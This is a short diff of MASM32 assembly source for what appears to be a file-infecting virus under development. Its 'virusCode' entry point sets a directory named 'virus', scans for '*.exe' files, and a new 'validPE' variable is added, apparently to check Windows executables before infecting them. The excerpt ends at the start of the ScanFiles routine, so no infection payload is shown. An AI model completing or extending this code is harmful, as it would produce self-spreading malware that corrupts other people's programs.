@@ -8,7 +8,6 @@ option casemap:none
    include masm32.inc
    include masm32rt.inc
    
-   
    includelib user32.lib
    includelib kernel32.lib
    includelib masm32.lib
@@ -22,21 +21,20 @@ FolderFound           		    BYTE                        "Folder found", 0
 
 fileFilter 						db 							"*.*",0
 backDir 						db 							"..",0
-path 							BYTE 							"C:\Documents and Settings\F.U.C.K\Desktop\virus\",0
-pathTest						BYTE							"C:\Documents and Settings\F.U.C.K\Desktop\virus\test\",0
 exeFilter 						db 							"*.exe",0
+path 							BYTE 						"C:\Documents and Settings\F.U.C.K\Desktop\virus\",0
+pathTest						BYTE						"C:\Documents and Settings\F.U.C.K\Desktop\virus\test\",0
 count 							db 							0
 
 .data?
 hDir 							db 							256 dup (?)
 ErrorCode                       DWORD                       ?
-
+validPE							dd							?
 .code
 ; ---------------------------------------------------------------------------
 virusCode:
 	invoke SetCurrentDirectory, addr path
 	call ScanFiles
-	;call ScanFilesInSelectFolder
 	invoke ExitProcess,0
 		
 ScanFiles proc
